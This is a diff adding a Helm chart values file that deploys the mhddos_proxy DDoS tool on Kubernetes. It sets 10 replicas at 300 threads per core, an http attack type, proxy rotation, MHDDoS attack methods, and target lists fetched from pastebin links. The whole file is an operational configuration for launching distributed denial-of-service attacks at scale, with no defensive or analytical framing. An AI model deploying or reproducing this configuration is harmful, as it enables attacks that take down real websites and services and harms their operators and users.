@@ -1,0 +1,48 @@
+replicaCount: 10
+
+# Type of DDoS attack (http (ip+port), https (url), tcp, udp)
+type: http
+
+# A list of targets
+# targets: https://pastebin.com/raw/Sg5GD5wU # tcp
+targets: https://pastebin.com/raw/V5ZA8qv6 # http
+
+# Threads per CPU core (Default is 300. Total amount = threads*replicaCount)
+threads: 300
+
+# How often to update the proxies (Default is 900)
+period: 1200
+
+# How many requests to send on a single proxy connection (default is 2000)
+# tcp -> rpc = 1000
+# http -> rpc = 100
+requests: 100
+
+# List of HTTP(s) attack methods to use. (Default is GET, POST, STRESS, BOT, PPS)
+# Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)
+methods: ""
+
+image:
+  repository: ghcr.io/porthole-ascend-cinnamon/mhddos_proxy
+  pullPolicy: Always
+  # Overrides the image tag whose default is the chart appVersion.
+  tag: "latest"
+
+imagePullSecrets: []
+nameOverride: ""
+fullnameOverride: ""
+
+podAnnotations: {}
+podSecurityContext: {}
+securityContext: {}
+nodeSelector: {}
+tolerations: []
+affinity: {}
+
+resources: {}
+  # limits:
+  #   cpu: 100m
+  #   memory: 128Mi
+  # requests:
+  #   cpu: 100m
+  #   memory: 128Mi
